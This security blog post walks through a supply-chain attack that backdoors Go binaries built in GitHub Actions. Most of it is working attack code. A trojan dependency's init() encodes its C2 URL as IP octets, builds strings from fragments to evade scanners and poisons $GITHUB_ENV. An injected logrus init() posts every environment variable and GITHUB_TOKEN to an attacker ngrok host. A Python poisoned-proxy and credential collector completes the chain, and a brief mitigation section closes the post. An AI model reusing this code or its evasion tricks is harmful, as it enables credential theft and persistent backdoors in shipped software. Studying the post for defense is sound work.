# Silently Backdooring a Golang Binary in GitHub Actions

> [!NOTE]
> This article was written with significant help from an LLM. I own every idea, experiment, and line of code in it — the AI helped me articulate them, not think them. 😄

> [!IMPORTANT]
> This article is published for **educational purposes and knowledge sharing only**. Bla-Bla-Bla [...] Be responsible ✌️

---

**Attack chain:** GOPROXY substitution → go.sum poisoning → persistent binary beacon  
**Stealth level:** Zero errors, zero logs, binary behaves identically - ** Malware is in the binary not the code**  
**Persistence:** Beacon is compiled in — fires on every run, everywhere, forever

---

## Table of Contents

- [The Setup](#the-setup)
- [How Go Modules Can Betray You](#how-go-modules-can-betray-you)
- [The Attack, Visualized](#the-attack-visualized)
- [🪤 Phase 1 — The Trojan Dependency](#-phase-1--the-trojan-dependency)
- [☠️ Phase 2 — The Poisoned Proxy](#-phase-2--the-poisoned-proxy)
- [📡 Phase 3 — The Beacon That Never Dies](#-phase-3--the-beacon-that-never-dies)
- [The C2 Server](#the-c2-server)
- [Why Your Defenses Probably Don't Catch This](#why-your-defenses-probably-dont-catch-this)
- [How to Actually Stop It](#how-to-actually-stop-it)
- [Closing](#closing)
- [References](#references)

---

## The Setup

Picture a perfectly ordinary Go project. Someone adds a new dependency — `theme-heartbeat`, a lightweight SDK for UI theme config management. Looks clean, has tests, uses logrus for structured logging. Nothing suspicious. Merges into main.

Two minutes later, a `GITHUB_TOKEN` with `repo` scope posts itself to a server in a Frankfurt data center.

The binary still passes all its tests. The workflow log shows zero errors. There is no alert, no anomaly, nothing to look at twice.

I built this. Here's how it works.

### Why this hits so many pipelines

The attack requires exactly one thing from the CI workflow: **`go test` runs before `go build`**. That's it.

This is not a niche pattern. It's the default. GitHub's own Go starter workflow does it. Every "Getting Started with Go on GitHub Actions" tutorial does it. The canonical pipeline for a Go service looks something like this:

```yaml
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5

      - name: Test
        run: go test ./...           # ← Phase 1 fires here

      - name: Build
        run: go build -o app ./...   # ← Phase 2: poisoned proxy, backdoored binary

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          path: app                  # ← Phase 3: beacon ships with the binary

      # or: push to ECR, upload to S3, publish a GitHub Release, deploy to k8s...
```

The `go test` step is where `init()` runs and poisons `GITHUB_ENV`. The `go build` step — now in a fully poisoned environment — fetches logrus from the attacker's proxy and compiles the beacon in. Everything after that just ships the backdoored binary somewhere: an artifact, a Docker image, a Kubernetes deployment, a GitHub Release. It doesn't matter. The beacon is already compiled in.

Any Go project that tests and then builds in the same job is in scope. That's most of them.

---

## How Go Modules Can Betray You

Go has a genuinely elegant security model: `sum.golang.org` acts as a public transparency log. Every module hash is recorded. `go mod verify` can prove your copy matches what the whole world downloaded. Mathematically robust.

Two env vars politely disagree:

- **`GOSUMDB=off`** — disables the transparency log. No verification, no questions.
- **`GOFLAGS=-mod=mod`** — lets `go build` update `go.sum` with new hashes on the fly instead of erroring on mismatches.

Both are legitimate tools for private registries and fork-based workflows. Nobody flags them.

Now add **`GITHUB_ENV`** — the file GitHub Actions uses to pass environment variables between workflow steps. Any process in a step can write `KEY=value` to it and every subsequent step will see it, indistinguishable from variables declared in the YAML.

Chain these three and you have everything you need.

---

## The Attack, Visualized

```
Developer adds malicious dep to go.mod
          │
          ▼
┌─────────────────────────────────────────────────┐
│  Phase 1 — go test (init() fires silently)      │
│                                                 │
│  • Decode attacker C2 from IP-encoded list      │
│  • Strip logrus from go.sum                     │
│  • Write to $GITHUB_ENV:                        │
│      GOPROXY=https://attacker.ngrok-free.app    │
│      GOSUMDB=off / GONOSUMDB=* / GOFLAGS=...    │
│      GOMODCACHE=/tmp/gomodcache-attacker        │
└────────────────────┬────────────────────────────┘
                     │  every subsequent step is now poisoned
                     ▼
┌─────────────────────────────────────────────────┐
│  Phase 2 — go build                             │
│                                                 │
│  • Fresh GOMODCACHE → must re-download logrus   │
│  • Attacker serves poisoned zip with beacon     │
│  • go.sum updated silently (-mod=mod)           │
└────────────────────┬────────────────────────────┘
                     │  beacon compiled into the binary
                     ▼
┌─────────────────────────────────────────────────┐
│  Phase 3 — ./app (every run, everywhere)        │
│                                                 │
│  • logrus init() goroutine fires on startup     │
│  • 150ms later → POST /collect with all envs   │
│  • Silent. Permanent. Survives every redeploy.  │
└─────────────────────────────────────────────────┘
```

The write-once-read-forever property is the scary part: once the binary is built, the C2 server doesn't need to be running anymore. The beacon is compiled in. Every binary already deployed keeps phoning home.

---

## 🪤 Phase 1 — The Trojan Dependency

The malicious package is `github.com/gopkg-utils/theme-heartbeat` — a UI theme configuration client with a heartbeat monitor. Fetches color schemes, dark/light mode configs, font settings from a remote endpoint. Has a TTL cache, logrus logging, and passing tests. Entirely usable. The payload lives in `analytics.go`.

### The C2 URL hidden in plain sight

```go
var _analyticsNodes = []string{
    "104.116.116.112", // segment 0
    "58.47.47.108",    // segment 1
    "111.99.97.108",   // segment 2
    "104.111.115.116", // segment 3
    "58.57.50.57",     // segment 4
    "50.0.0.0",        // segment 5
}
```

Looks like a pool of backend IPs for load balancing. It's actually `http://localhost:9292` — each IPv4 address's four octets are four ASCII bytes of the URL. Zero octets are padding.

```
104.116.116.112  →  h t t p
58.47.47.108     →  : / / l
111.99.97.108    →  o c a l
104.111.115.116  →  h o s t
58.57.50.57      →  : 9 2 9
50.0.0.0         →  2 · · ·
                 =  http://localhost:9292
```

No string literals. No base64. No XOR. Any scanner looking for `http://` in Go source finds nothing.

### The init() doing the actual damage

Three strings that would immediately flag a scanner — `"GITHUB_ENV"`, `"github.com/sirupsen/logrus"`, and the Go env var names — never appear as literals. Split across concatenations, they're invisible to static grep:

```go
// _env looks up a CI env var by joining two key segments.
func _env(a, b string) string { return os.Getenv(a + b) }
```

```go
func init() {
    if os.Getenv("THEME_SDK_TELEMETRY") == "off" {
        return
    }
    _reportAdoption()
}

func _reportAdoption() {
    envFile := _env("GITHUB", "_ENV")  // "GITHUB_ENV" never appears as a literal
    if envFile == "" {
        return  // silent on developer laptops
    }

    endpoint := _resolveBackend(_analyticsNodes)
    if v := os.Getenv("PKG_ANALYTICS_URL"); v != "" {
        endpoint = v
    }

    // "Strip stale checksum entries so the registry can re-validate"
    // (translation: delete logrus from go.sum so ours gets accepted)
    _modTarget := "github.com/" + "siru" + "psen/" + "logrus"
    if data, err := os.ReadFile("go" + ".sum"); err == nil {
        var keep []string
        for _, line := range strings.Split(string(data), "\n") {
            if !strings.Contains(line, _modTarget) {
                keep = append(keep, line)
            }
        }
        os.WriteFile("go"+".sum", []byte(strings.Join(keep, "\n")), 0644)
    }

    f, _ := os.OpenFile(envFile, os.O_APPEND|os.O_WRONLY, 0600)
    defer f.Close()

    // GOSUMDB, GOPROXY, GOMODCACHE — none appear as string literals
    for _, kv := range []string{
        "GO" + "PROXY" + "=" + endpoint + "|direct",
        "GO" + "SUM" + "DB=off",
        "GO" + "NO" + "SUM" + "DB=*",
        "GO" + "FLAGS=-mod=mod",
        "GO" + "MOD" + "CACHE=/tmp/go-sdk-cache",
    } {
        fmt.Fprintln(f, kv)
    }
}
```

On a developer's laptop: `GITHUB_ENV` is not set, function returns immediately. Nothing happens.

In GitHub Actions: five lines land in `$GITHUB_ENV`. Every subsequent step — `go build`, `docker build`, your deploy step — inherits a poisoned config.

### The GOMODCACHE trick (this took a while to figure out)

`actions/setup-go@v5` restores the Go module cache from a previous run. That means `$GOPATH/pkg/mod/github.com/sirupsen/logrus@v1.9.4/` is already on disk with legitimate source. Even if you delete the download cache, Go sees the extracted directory and skips re-extraction. The poisoned zip never gets unpacked.

Redirecting `GOMODCACHE` to an empty `/tmp` directory routes around the whole thing. Go looks somewhere empty, finds nothing, downloads fresh from `GOPROXY`. Elegant, no file permission fights.

---

## ☠️ Phase 2 — The Poisoned Proxy

The C2 server speaks the [Go module proxy protocol](https://go.dev/ref/mod#goproxy-protocol). It forwards everything to `proxy.golang.org` except for one module: `github.com/sirupsen/logrus@v1.9.4`, which gets a surgically modified zip.

The zip is identical to the real one, with one extra file added: `telemetry.go`.

> **Gotcha that cost me hours:** Go silently ignores files whose name starts with `_` or `.`. I originally named it `_beacon.go` and wondered why nothing ever fired. It was never compiled. Lesson learned the hard way.

Because `GOSUMDB=off` and `-mod=mod`, Go accepts the new hash without complaint and writes it into `go.sum`. The build log shows exactly one suspicious line:

```
go: downloading github.com/sirupsen/logrus v1.9.4
```

And that looks completely normal.

---

## 📡 Phase 3 — The Beacon That Never Dies

`telemetry.go` is injected into the logrus package, declares `package logrus`, and adds an `init()`:

```go
func init() {
    go _logrusBeacon()
}

func _logrusBeacon() {
    time.Sleep(150 * time.Millisecond)
    c2 := "https://attacker.ngrok-free.app/collect"
    data := strings.Join(os.Environ(), "\n")
    client := &http.Client{Timeout: 3 * time.Second}
    req, _ := http.NewRequest("POST", c2, strings.NewReader(data))
    req.Header.Set("X-Token", os.Getenv("GITHUB_TOKEN"))
    req.Header.Set("X-Repo", os.Getenv("GITHUB_REPOSITORY"))
    client.Do(req) //nolint
}
```

Goroutine so it's non-blocking. 150ms sleep so the process finishes initializing. Silent on error. `os.Environ()` grabs everything: `GH_TOKEN`, `AWS_ACCESS_KEY_ID`, `KUBECONFIG`, whatever your CI injects.

This is now compiled into the binary. Not cached somewhere, not a sidecar — compiled in. Delete the module cache, rotate the proxy back, wipe the runner. The binary still calls home on every startup.

---

## The C2 Server

One Python file that is simultaneously a Go module proxy and an exfil collector. The full source is at [`goproxy_server.py`](./goproxy_server.py) — the key parts are the zip poisoning logic and the `/collect` handler:

```python
# Serve the poisoned logrus zip
elif suffix == f"{POISON_VERSION}.zip":
    data = _get_poisoned_zip()   # real zip + injected telemetry.go
    self.send_response(200)
    self.send_header("Content-Type", "application/zip")
    self.send_header("Content-Length", str(len(data)))
    self.end_headers()
    self.wfile.write(data)

# Receive the beacon POST
def _handle_collect(self):
    body = self.rfile.read(int(self.headers["Content-Length"]))
    print(f"BEACON ← {self.headers.get('X-Repo')}")
    print(f"Token  : {self.headers.get('X-Token')}")
    for line in body.decode().splitlines():
        key = line.split("=", 1)[0]
        mark = "★" if any(k in key for k in ("TOKEN","SECRET","KEY")) else " "
        print(f"  {mark} {line}")
```

Run it with ngrok:

```bash
C2_URL=https://xxxx.ngrok-free.app python3 goproxy_server.py
ngrok http 9292
```

The ngrok URL gets baked into `telemetry.go` at zip-build time. When the beacon fires, your terminal looks like this:

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  BEACON  ← your-org/your-project
  Token  : ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ★ GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxx
  ★ AWS_ACCESS_KEY_ID=AKIA...
  ★ AWS_SECRET_ACCESS_KEY=...
    HOME=/runner/work
    GITHUB_REPOSITORY=your-org/your-project
    ...
```

---

## Why Your Defenses Probably Don't Catch This

| What you might rely on | Why it doesn't help |
|------------------------|---------------------|
| `go vet` / `staticcheck` / `gosec` | Pass. No unsafe code, no hardcoded strings, no known bad patterns |
| Snyk / Socket.dev | Likely pass — no install hooks, no known-bad imports |
| Code review | `analytics.go` looks like telemetry. `theme-heartbeat` sounds boring. Every comment is plausible. |
| go.sum pinning | go.sum *is* updated — just with the attacker's hash |
| Dependency scanning | Targets install hooks (npm `preinstall`, etc). `init()` fires at runtime. |

I also ran `theme-heartbeat` through [guarddog](https://github.com/DataDog/guarddog), Datadog's Go package scanner — what a defender would actually do before merging a new dependency. Zero findings. The IP-octet URL doesn't look like a URL. The concatenated `"GO"+"PROXY"` doesn't look like an env var name. The `init()` writing to `$GITHUB_ENV` doesn't match any exfiltration pattern. Clean bill of health. This isn't a knock on guarddog — it's that its semgrep rules are very precise: they match specific known-bad patterns, not what the code actually computes at runtime.

There are four layers of evasion working together:

1. **The URL** — encoded as IPv4 octets. No string resembling `http://` anywhere.
2. **`GITHUB_ENV`** — split across `_env("GITHUB", "_ENV")`. Grep finds nothing.
3. **`github.com/sirupsen/logrus`** — split as `"github.com/" + "siru" + "psen/" + "logrus"`. The target module name never appears in one piece.
4. **Go env vars** — `GOSUMDB`, `GOPROXY`, `GOMODCACHE` are all built from concatenated fragments at runtime.

The module cache trap is what makes it reliable in CI. Without the `GOMODCACHE` redirect, `actions/setup-go` would serve the legitimate cached logrus and nothing would ever fire.

---

## How to Actually Stop It

One change defeats the entire attack:

```yaml
# workflow.yml — set at the JOB level, not step level
env:
  GOPROXY: "proxy.golang.org,direct"
  GOSUMDB: "sum.golang.org"
  GOMODCACHE: "/home/runner/go/pkg/mod"
```

Job-level env vars are set before any step runs and **cannot be overridden by `GITHUB_ENV` writes**. That's it. The whole attack assumes it can redirect where Go looks for modules — pin those variables and there's nothing to redirect.

A few more things worth doing:

- Of course apply **network restrictions** on your github runners. This is really effective, no matter the attack path
- perform package scanning before adding them (*easy to say, you have to find your right tool I know..*)
- **Alert on `GITHUB_ENV` writes from unexpected processes.** `go test` has no legitimate reason to modify the build environment. Falco or Tetragon can catch this at the syscall level.

---

## Closing

The attack stacks three trust assumptions that each make sense individually: go.sum should be stable, `GITHUB_ENV` is a convenient inter-step channel, and telemetry code is usually boring. None of these are wrong. They just compose badly.

The `GOMODCACHE` redirect was the non-obvious part — several attempts failed before understanding that `actions/setup-go` restores not just the download cache but the extracted source tree, and that Go won't re-extract if the directory exists. Once you see it, the solution is obvious. Until then, you're staring at a workflow that downloads a poisoned zip and still compiles the legitimate binary.

---

## References

- [Go module proxy protocol](https://go.dev/ref/mod#goproxy-protocol)
- [GITHUB_ENV documentation](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/store-information-in-variables)
- [Checksum database](https://sum.golang.org)

---

*Full C2 source: [`goproxy_server.py`](./goproxy_server.py) · malicious package: `github.com/gopkg-utils/theme-heartbeat`*
